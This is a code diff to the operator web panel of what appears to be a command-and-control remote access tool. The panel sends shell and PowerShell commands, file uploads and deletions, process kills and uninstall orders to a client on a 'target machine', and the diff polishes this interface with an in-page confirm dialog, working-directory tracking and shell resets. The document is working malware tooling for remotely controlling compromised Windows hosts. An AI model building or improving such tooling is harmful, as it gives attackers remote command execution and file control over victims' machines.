@@ -886,6 +886,29 @@ C:\&gt;</div>
     </div>
 
     <script>
+        // ── In-panel confirm dialog (replaces browser confirm()) ──────────
+        function confirmDialog(message, onConfirm, confirmText = 'Confirm', danger = true) {
+            const existing = document.getElementById('_cdialog');
+            if (existing) existing.remove();
+            const overlay = document.createElement('div');
+            overlay.id = '_cdialog';
+            overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center;animation:fadeIn 0.15s ease;';
+            overlay.innerHTML = `
+                <div style="background:var(--bg-card);border:1px solid var(--border-color);border-radius:14px;padding:24px 28px;max-width:380px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,0.5);">
+                    <p style="font-size:14px;color:var(--text-primary);margin:0 0 20px;line-height:1.5;">${message}</p>
+                    <div style="display:flex;gap:10px;justify-content:flex-end;">
+                        <button id="_cd_cancel" style="padding:8px 18px;background:transparent;border:1px solid var(--border-color);border-radius:8px;color:var(--text-secondary);font-size:13px;cursor:pointer;font-family:var(--font-sans);">Cancel</button>
+                        <button id="_cd_ok" style="padding:8px 18px;background:${danger ? 'var(--accent-red)' : 'var(--primary)'};border:none;border-radius:8px;color:#fff;font-size:13px;font-weight:600;cursor:pointer;font-family:var(--font-sans);">${confirmText}</button>
+                    </div>
+                </div>`;
+            document.body.appendChild(overlay);
+            const close = () => overlay.remove();
+            overlay.addEventListener('click', e => { if (e.target === overlay) close(); });
+            document.getElementById('_cd_cancel').onclick = close;
+            document.getElementById('_cd_ok').onclick = () => { close(); onConfirm(); };
+        }
+        // ─────────────────────────────────────────────────────────────────
+
         const params = new URLSearchParams(window.location.search);
         const clientId = params.get('id');
         if (!clientId) window.location.href = '/';
@@ -1018,15 +1041,15 @@ C:\&gt;</div>
 
         // Uninstall button
         document.getElementById('btn-uninstall').addEventListener('click', async () => {
-            if (!confirm('Uninstall client from target machine?')) return;
-            try {
-                await fetch('/api/c2/command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ client_id: clientId, command: 'uninstall' })
-                });
-                alert('Uninstall command sent.');
-            } catch { alert('Failed to send command.'); }
+            confirmDialog('Uninstall client from target machine?', async () => {
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'uninstall' })
+                    });
+                } catch {}
+            }, 'Uninstall');
         });
 
         // Remote Desktop controls
@@ -1272,48 +1295,57 @@ C:\&gt;</div>
 
         // Terminal & Task Manager Logic
         let currentShellMode = 'cmd';
+        let currentCwd = 'C:\\';
 
         const TERM_BTN_ACTIVE  = 'padding:6px 16px;font-size:12px;font-weight:600;border:1px solid var(--primary);background:var(--primary-dim);color:var(--primary);border-radius:7px;cursor:pointer;font-family:var(--font-sans);transition:all 0.15s;';
         const TERM_BTN_INACTIVE = 'padding:6px 16px;font-size:12px;font-weight:600;border:1px solid transparent;background:transparent;color:var(--text-secondary);border-radius:7px;cursor:pointer;font-family:var(--font-sans);transition:all 0.15s;';
 
+        function updatePromptLabel() {
+            const lbl = document.getElementById('term-prompt-label');
+            if (!lbl) return;
+            lbl.textContent = currentShellMode === 'cmd' ? (currentCwd + '>') : ('PS ' + currentCwd + '>');
+        }
+
         window.setTerminalShell = function(mode) {
             currentShellMode = mode;
             const cmdBtn = document.getElementById('term-mode-cmd');
-            const psBtn = document.getElementById('term-mode-ps');
-            const promptLbl = document.getElementById('term-prompt-label');
+            const psBtn  = document.getElementById('term-mode-ps');
             const screen = document.getElementById('terminal-screen');
 
             if (mode === 'cmd') {
                 cmdBtn.style.cssText = TERM_BTN_ACTIVE;
-                psBtn.style.cssText = TERM_BTN_INACTIVE;
-                promptLbl.textContent = 'C:\\>';
-                screen.textContent += '\nMicrosoft Windows [Version 10.0.22621.1]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\>\n';
+                psBtn.style.cssText  = TERM_BTN_INACTIVE;
+                screen.textContent += '\nSwitched to CMD. Shell session reset.\n';
             } else {
                 cmdBtn.style.cssText = TERM_BTN_INACTIVE;
-                psBtn.style.cssText = TERM_BTN_ACTIVE;
-                promptLbl.textContent = 'PS C:\\>';
-                screen.textContent += '\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\>\n';
+                psBtn.style.cssText  = TERM_BTN_ACTIVE;
+                screen.textContent += '\nSwitched to PowerShell. Shell session reset.\n';
             }
+            // Reset shell on target
+            fetch('/api/c2/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ client_id: clientId, command: 'shell_reset' })
+            }).catch(() => {});
+            currentCwd = 'C:\\';
+            updatePromptLabel();
             screen.scrollTop = screen.scrollHeight;
         };
 
         window.clearTerminalOutput = function() {
-            if (currentShellMode === 'cmd') {
-                document.getElementById('terminal-screen').textContent = 'Microsoft Windows [Version 10.0.22621.1]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\>\n';
-            } else {
-                document.getElementById('terminal-screen').textContent = 'Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\>\n';
-            }
+            document.getElementById('terminal-screen').textContent = '';
         };
 
         window.sendTerminalCommand = async function() {
-            const input = document.getElementById('term-input');
+            const input  = document.getElementById('term-input');
             const screen = document.getElementById('terminal-screen');
             const cmdText = input.value.trim();
             if (!cmdText) return;
 
-            const prompt = currentShellMode === 'cmd' ? 'C:\\>' : 'PS C:\\>';
+            const prompt = currentShellMode === 'cmd' ? (currentCwd + '>') : ('PS ' + currentCwd + '>');
             input.value = '';
-            screen.textContent += `\n${prompt} ${cmdText}\n`;
+            input.disabled = true;
+            screen.textContent += `${prompt} ${cmdText}\n`;
             screen.scrollTop = screen.scrollHeight;
 
             const commandPayload = (currentShellMode === 'cmd' ? 'exec_cmd:' : 'exec_ps:') + cmdText;
@@ -1324,13 +1356,13 @@ C:\&gt;</div>
                     body: JSON.stringify({ client_id: clientId, command: commandPayload })
                 });
 
-                // Poll for response
                 let attempts = 0;
                 const pollRes = setInterval(async () => {
                     attempts++;
-                    if (attempts > 30) {
+                    if (attempts > 40) {
                         clearInterval(pollRes);
-                        screen.textContent += '\n[Error: Execution timeout]\n';
+                        screen.textContent += '[Timeout waiting for response]\n';
+                        input.disabled = false;
                         screen.scrollTop = screen.scrollHeight;
                         return;
                     }
@@ -1338,12 +1370,16 @@ C:\&gt;</div>
                     const data = await r.json();
                     if (data && data.output !== null && data.output !== undefined) {
                         clearInterval(pollRes);
-                        screen.textContent += data.output.toUpperCase() + '\n';
+                        if (data.output.trim()) screen.textContent += data.output + '\n';
+                        if (data.cwd) { currentCwd = data.cwd; updatePromptLabel(); }
+                        input.disabled = false;
+                        input.focus();
                         screen.scrollTop = screen.scrollHeight;
                     }
                 }, 500);
             } catch (err) {
-                screen.textContent += '\n[Error sending command: ' + err.message + ']\n';
+                screen.textContent += '[Error: ' + err.message + ']\n';
+                input.disabled = false;
                 screen.scrollTop = screen.scrollHeight;
             }
         };
@@ -1535,10 +1571,10 @@ C:\&gt;</div>
             } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
         };
 
-        window.fmDeleteSelected = async function() {
+        window.fmDeleteSelected = function() {
             if (!fmSelected || fmBusy) return;
-            if (!confirm('Delete "' + fmSelected.name + '"?\nThis cannot be undone.')) return;
-            fmBusy = true;
+            confirmDialog('Delete "' + fmSelected.name + '"? This cannot be undone.', async () => {
+                fmBusy = true;
             fmSetStatus('Deleting...', 'var(--text-muted)');
             try {
                 await fetch('/api/c2/command', {
@@ -1559,6 +1595,7 @@ C:\&gt;</div>
                     }
                 }, 400);
             } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+            }, 'Delete');
         };
 
         window.fmUploadFile = async function(input) {
@@ -1568,28 +1605,30 @@ C:\&gt;</div>
             const destPath = fmCurrentPath
                 ? (fmCurrentPath.replace(/\\$/, '') + '\\' + file.name)
                 : file.name;
-            if (!confirm('Upload "' + file.name + '" to ' + (fmCurrentPath || 'root') + '?')) { input.value = ''; return; }
-            fmBusy = true;
-            fmSetStatus('Uploading...', 'var(--text-muted)');
-            try {
-                const form = new FormData();
-                form.append('file', file);
-                form.append('path', destPath);
-                await fetch('/api/c2/fm/upload/' + encodeURIComponent(clientId), { method: 'POST', body: form });
-                let attempts = 0;
-                const poll = setInterval(async () => {
-                    attempts++;
-                    if (attempts > 30) { clearInterval(poll); fmSetStatus('Upload timeout', '#ef4444'); fmBusy = false; return; }
-                    const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
-                    const data = await r.json();
-                    if (data && data.type === 'fm_upload_res') {
-                        clearInterval(poll);
-                        if (data.success) { fmSetStatus('Uploaded: ' + file.name, '#22c55e'); fmRefresh(); }
-                        else { fmSetStatus('Error: ' + (data.error || 'failed'), '#ef4444'); fmBusy = false; }
-                    }
-                }, 500);
-            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
-            input.value = '';
+            const doUpload = async () => {
+                fmBusy = true;
+                fmSetStatus('Uploading...', 'var(--text-muted)');
+                try {
+                    const form = new FormData();
+                    form.append('file', file);
+                    form.append('path', destPath);
+                    await fetch('/api/c2/fm/upload/' + encodeURIComponent(clientId), { method: 'POST', body: form });
+                    let attempts = 0;
+                    const poll = setInterval(async () => {
+                        attempts++;
+                        if (attempts > 30) { clearInterval(poll); fmSetStatus('Upload timeout', '#ef4444'); fmBusy = false; return; }
+                        const r = await fetch('/api/c2/fm/result/' + encodeURIComponent(clientId));
+                        const data = await r.json();
+                        if (data && data.type === 'fm_upload_res') {
+                            clearInterval(poll);
+                            if (data.success) { fmSetStatus('Uploaded: ' + file.name, '#22c55e'); fmRefresh(); }
+                            else { fmSetStatus('Error: ' + (data.error || 'failed'), '#ef4444'); fmBusy = false; }
+                        }
+                    }, 500);
+                } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+                input.value = '';
+            };
+            confirmDialog('Upload "' + file.name + '" to ' + (fmCurrentPath || 'root') + '?', doUpload, 'Upload', false);
         };
 
         // Auto-load drives when File Manager tab is activated
@@ -1683,19 +1722,17 @@ C:\&gt;</div>
             }
         };
 
-        window.killTargetProcess = async function(pid, name) {
-            if (!confirm(`Kill process ${name} (PID: ${pid})?`)) return;
-            try {
-                await fetch('/api/c2/command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ client_id: clientId, command: 'kill:' + pid })
-                });
-                alert(`Kill command sent for ${name} (${pid})`);
-                setTimeout(fetchTaskManagerList, 1000);
-            } catch (err) {
-                alert('Failed to kill process: ' + err.message);
-            }
+        window.killTargetProcess = function(pid, name) {
+            confirmDialog(`Kill process <b>${escapeHtml(name)}</b> (PID: ${pid})?`, async () => {
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'kill:' + pid })
+                    });
+                    setTimeout(fetchTaskManagerList, 1000);
+                } catch {}
+            }, 'Kill');
         };
 
         // Mobile sidebar toggle
